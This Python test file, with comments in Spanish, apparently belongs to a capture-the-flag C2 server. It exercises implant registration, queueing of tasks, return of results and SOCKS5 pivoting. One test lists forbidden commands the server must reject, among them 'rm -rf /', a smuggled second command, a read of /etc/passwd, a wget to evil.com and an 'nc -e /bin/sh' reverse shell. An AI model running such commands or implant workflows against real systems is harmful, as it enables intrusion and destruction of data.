"""Tests de integración end-to-end (E2E) del C2.

Simula el flujo completo: servidor recibe registro, encola tarea,
implant la obtiene, ejecuta, y devuelven resultado.
"""
import json
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))


class TestE2EFlow:
    """Flujo completo: register -> task -> execute -> result."""

    def test_full_command_flow(self, client, auth_headers, fresh_store):
        """Simula el flujo completo de un comando."""
        # 1. Registrar agent
        agent_info = {
            "agent_id": "e2e-agent-1",
            "hostname": "target-host",
            "os": "Linux 5.15",
            "username": "operator",
            "ip": "192.168.1.100",
        }
        resp = client.post(
            "/register", headers=auth_headers, data=json.dumps(agent_info)
        )
        assert resp.status_code == 200
        agent_id = resp.get_json()["agent_id"]
        assert agent_id == "e2e-agent-1"

        # 2. Verificar que el agent aparece en la lista
        resp = client.get("/agents", headers=auth_headers)
        assert resp.status_code == 200
        agents = resp.get_json()["agents"]
        assert len(agents) == 1
        assert agents[0]["hostname"] == "target-host"

        # 3. Heartbeat
        resp = client.post(
            "/heartbeat",
            headers=auth_headers,
            data=json.dumps({"agent_id": agent_id}),
        )
        assert resp.status_code == 200

        # 4. No hay tareas pendientes
        resp = client.get(f"/task/{agent_id}", headers=auth_headers)
        assert resp.status_code == 200
        assert resp.get_json()["task"] is None

        # 5. Operador encola un comando
        resp = client.post(
            f"/task/{agent_id}",
            headers=auth_headers,
            data=json.dumps({"command": "whoami"}),
        )
        assert resp.status_code == 201
        task = resp.get_json()["task"]
        assert task["command"] == "whoami"
        task_id = task["task_id"]

        # 6. Implant obtiene la tarea
        resp = client.get(f"/task/{agent_id}", headers=auth_headers)
        assert resp.status_code == 200
        dispatched = resp.get_json()["task"]
        assert dispatched is not None
        assert dispatched["command"] == "whoami"
        assert dispatched["task_id"] == task_id

        # 7. Implant envía resultado
        resp = client.post(
            f"/result/{agent_id}",
            headers=auth_headers,
            data=json.dumps({"task_id": task_id, "output": "operator"}),
        )
        assert resp.status_code == 200

        # 8. Operador consulta resultado
        resp = client.get(f"/results/{agent_id}", headers=auth_headers)
        assert resp.status_code == 200
        results = resp.get_json()["results"]
        assert len(results) == 1
        assert results[0]["output"] == "operator"

    def test_multiple_commands_flow(self, client, auth_headers, fresh_store):
        """Simula múltiples comandos secuenciales."""
        # Register
        client.post(
            "/register",
            headers=auth_headers,
            data=json.dumps(
                {"agent_id": "multi-cmd", "hostname": "h", "os": "L", "username": "u", "ip": "1.1.1.1"}
            ),
        )

        # Enviar varios comandos
        commands = ["whoami", "hostname", "ls -la", "uname -a", "id"]
        task_ids = []
        for cmd in commands:
            resp = client.post(
                "/task/multi-cmd",
                headers=auth_headers,
                data=json.dumps({"command": cmd}),
            )
            assert resp.status_code == 201
            task_ids.append(resp.get_json()["task"]["task_id"])

        # Obtener cada tarea y verificar que es la correcta
        for i, expected_cmd in enumerate(commands):
            resp = client.get("/task/multi-cmd", headers=auth_headers)
            task = resp.get_json()["task"]
            assert task is not None
            assert task["command"] == expected_cmd

        # Enviar resultados
        for i, tid in enumerate(task_ids):
            resp = client.post(
                "/result/multi-cmd",
                headers=auth_headers,
                data=json.dumps({"task_id": tid, "output": f"output_{i}"}),
            )
            assert resp.status_code == 200

        # Verificar que hay 5 resultados
        resp = client.get("/results/multi-cmd", headers=auth_headers)
        assert len(resp.get_json()["results"]) == 5

    def test_rejected_command_returns_400(self, client, auth_headers, fresh_store):
        """Comandos prohibidos retornan 400 sin crear tarea."""
        client.post(
            "/register",
            headers=auth_headers,
            data=json.dumps(
                {"agent_id": "sec-test", "hostname": "h", "os": "L", "username": "u", "ip": "1.1.1.1"}
            ),
        )

        forbidden = [
            "rm -rf /",
            "whoami; rm -rf /",
            "cat /etc/passwd | grep root",
            "wget http://evil.com",
            "nc -e /bin/sh 1.2.3.4 4444",
        ]

        for cmd in forbidden:
            resp = client.post(
                "/task/sec-test",
                headers=auth_headers,
                data=json.dumps({"command": cmd}),
            )
            assert resp.status_code == 400, f"Command {cmd!r} was NOT rejected!"

        # No se crearon tareas
        resp = client.get("/task/sec-test", headers=auth_headers)
        assert resp.get_json()["task"] is None


class TestE2ESOCKS5:
    """Flujo SOCKS5: connect -> data relay."""

    def test_socks_connect_creates_task(self, client, auth_headers, fresh_store):
        """Verificar que SOCKS_CONNECT crea una tarea para el implant."""
        fresh_store.register(
            {"hostname": "h", "os": "L", "username": "u", "ip": "1.1.1.1"},
            agent_id="socks-e2e",
        )

        resp = client.post(
            "/socks/connect",
            headers=auth_headers,
            json={
                "agent_id": "socks-e2e",
                "target_host": "10.0.0.5",
                "target_port": 22,
            },
        )
        assert resp.status_code == 201
        channel_id = resp.get_json()["channel_id"]

        # Verificar que se creó una tarea
        resp = client.get("/task/socks-e2e", headers=auth_headers)
        task = resp.get_json()["task"]
        assert task is not None
        assert "SOCKS_CONNECT" in task["command"]
        assert channel_id in task["command"]
        assert "10.0.0.5" in task["command"]
        assert "22" in task["command"]

    def test_socks_data_relay(self, client, auth_headers):
        """Verificar relay de datos a través del canal."""
        import base64

        # Simular datos del operador -> implant
        data_out = base64.b64encode(b"GET / HTTP/1.1\r\n").decode()
        resp = client.post(
            "/socks/data/test_channel",
            headers=auth_headers,
            json={"data": data_out},
        )
        assert resp.status_code == 200

        # Simular datos del target -> operador
        data_in = base64.b64encode(b"HTTP/1.1 200 OK\r\n").decode()
        resp = client.post(
            "/socks/data/test_channel",
            headers=auth_headers,
            json={"data": data_in},
        )
        assert resp.status_code == 200


class TestHealthPublic:
    """Verificar endpoints públicos sin auth."""

    def test_health(self, client):
        resp = client.get("/health")
        assert resp.status_code == 200
        assert resp.get_json()["status"] == "ok"

    def test_index(self, client):
        resp = client.get("/")
        assert resp.status_code == 200
        body = resp.get_json()
        assert body["nonce"] == "sentrysec-2026"
        assert body["status"] == "running"

    def test_dashboard(self, client):
        resp = client.get("/dashboard")
        assert resp.status_code == 200
        assert b"C2 CTF SecOpsDays" in resp.data
